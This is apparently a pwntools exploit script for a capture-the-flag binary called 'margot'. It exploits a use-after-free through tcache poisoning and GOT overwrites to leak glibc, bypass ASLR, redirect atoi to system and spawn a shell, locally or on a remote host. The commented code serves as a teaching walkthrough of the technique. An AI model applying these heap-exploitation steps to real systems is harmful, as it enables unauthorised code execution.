#!/usr/bin/env python3

from pwn import *
from typing import Union

context.binary = elf = ELF('margot')
glibc = ELF('glibc/libc.so.6', checksec=False)


def get_process():
    if len(sys.argv) == 1:
        return elf.process()

    host, port = sys.argv[1], sys.argv[2]
    return remote(host, int(port))


# Helper functions


def do_maths(p, x: Union[int, str]):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Input number x? ', str(x).encode())


def do_history(p, task: bytes, confirm: bool):
    p.sendlineafter(b'> ', b'2')
    p.sendafter(b"What's your task about? ", task)
    p.sendlineafter(b'[y/n]\n', b'y' if confirm else b'n')


def do_pwn(p, task: bytes):
    p.sendlineafter(b'> ', b'3')
    p.sendafter(b"I hate history, let's have fun!\n", task)


# We have this options:

'''
$ ./margot
Margot has a lot of homework to do, so I wrote a program to help her
What should I do?
1. Maths
2. History
3. Pwn
4. Exit
>
'''

# "Maths" asks for a number `x`, and uses `read` and `atoi`. Then it performs some operations with `y = 1337`. One of them is `pow(x, y)`. Operations are chosen randomly among 4 operations.

# "History" allocates a chunk sized 80 bytes using `malloc`. Then we can enter some data (no overflows) and free the chunk if we don't like it. The pointer for `homework` (global variable) is not removed

# "Pwn" allows us to write up to 80 bytes in `homework`, which can lead to a Use After Free (UAF)

# Additional data: Glibc 2.27 (uses Tcache)

# Objective: UAF -> Tcache poisoning -> GOT overwrite -> Leak Glibc -> GOT overwrite -> system("/bin/sh")


def main():
    p = get_process()

    # Allocate a chunk and free it
    do_history(p, b'A', False)

    # Modify the `fd` pointer (UAF) so that we poison the Tcache
    do_pwn(p, p64(elf.got.pow))

    # Perform Tcache poisoning and set `pow = puts`
    do_history(p, b'B', True)
    do_history(p, p64(elf.plt.puts), True)

    # Now we will use `do_maths` until the operation is `pow`. We will set `x` to be the address of a GOT function entry (in decimal), so that `pow` (`puts`) prints the real address of that function in Glibc (bypass ASLR)

    # Something strange happens here, The value sent to `pow` (`puts`) is modified to `unsafe_state`, which points to `randtbl+20` (debugging with GDB helps). But it suffices to bypass ASLR

    # Debug with GDB:
    # gdb.attach(p, 'break *do_maths+241\ncontinue')

    i = 0

    while True:
        do_maths(p, elf.got.puts)
        p.recvline()
        res = p.recvline()

        # Again, something strange happens if there are more calls to `do_maths`, after some testing, we can see that each call adds `4` to `randtbl+20`. However, this is optional because 1/4 times the first call will execute `pow` (`puts`), which is enough to bypass ASLR
        if b'x' in res and b'y' in res and b'=' in res:
            i += 1
            continue

        randtbl_addr = u64(res.strip().ljust(8, b'\0')) - 20 - 4 * i
        log.info(f'Leaked randtbl() address: {hex(randtbl_addr)}')
        break

    # Bypass ASLR
    glibc.address = randtbl_addr - glibc.sym.randtbl
    log.success(f'Glibc base address: {hex(glibc.address)}')

    # We will use `do_pwn` because `homework` still points to the GOT entry of `pow`. Probably, we can enter junk data, but let's keep things clean. This is the GOT at the start:
    '''
    pwndbg> got

    GOT protection: Partial RELRO | GOT functions: 15

    [0x404018] free@GLIBC_2.2.5 -> 0x401030 ◂— endbr64
    [0x404020] puts@GLIBC_2.2.5 -> 0x7ffff7a649c0 (puts) ◂— push   r13
    [0x404028] pow@GLIBC_2.29 -> 0x401050 ◂— endbr64
    [0x404030] __stack_chk_fail@GLIBC_2.4 -> 0x401060 ◂— endbr64
    [0x404038] setbuf@GLIBC_2.2.5 -> 0x7ffff7a6c4d0 (setbuf) ◂— mov    edx, 0x2000
    [0x404040] printf@GLIBC_2.2.5 -> 0x7ffff7a48e80 (printf) ◂— sub    rsp, 0xd8
    [0x404048] read@GLIBC_2.2.5 -> 0x401090 ◂— endbr64
    [0x404050] srand@GLIBC_2.2.5 -> 0x7ffff7a27bb0 (srandom) ◂— sub    rsp, 8
    [0x404058] getchar@GLIBC_2.2.5 -> 0x7ffff7a6bf00 (getchar) ◂— push   rbx
    [0x404060] time@GLIBC_2.2.5 -> 0x7ffff7ffa9e0 (time) ◂— lea    rax, [rip - 0x4967]
    [0x404068] malloc@GLIBC_2.2.5 -> 0x4010d0 ◂— endbr64
    [0x404070] atoi@GLIBC_2.2.5 -> 0x4010e0 ◂— endbr64
    [0x404078] __isoc99_scanf@GLIBC_2.7 -> 0x7ffff7a5fec0 (__isoc99_scanf) ◂— push   rbx
    [0x404080] exit@GLIBC_2.2.5 -> 0x401100 ◂— endbr64
    [0x404088] rand@GLIBC_2.2.5 -> 0x401110 ◂— endbr64
    '''

    # The idea is to set `atoi = system`. Then, we can use `do_maths` to enter `"/bin/sh"` so that it is the first argument of `atoi` (`system`). We need exactly 80 bytes. At this point, `one_gadget` shells probably work as well

    payload  = p64(elf.plt.pow)
    payload += p64(glibc.sym.__stack_chk_fail)
    payload += p64(glibc.sym.setbuf)
    payload += p64(glibc.sym.printf)
    payload += p64(glibc.sym.read)
    payload += p64(glibc.sym.srand)
    payload += p64(glibc.sym.getchar)
    payload += p64(glibc.sym.time)
    payload += p64(glibc.sym.malloc)
    payload += p64(glibc.sym.system)

    do_pwn(p, payload)
    do_maths(p, '/bin/sh\0')

    p.interactive()


if __name__ == '__main__':
    main()
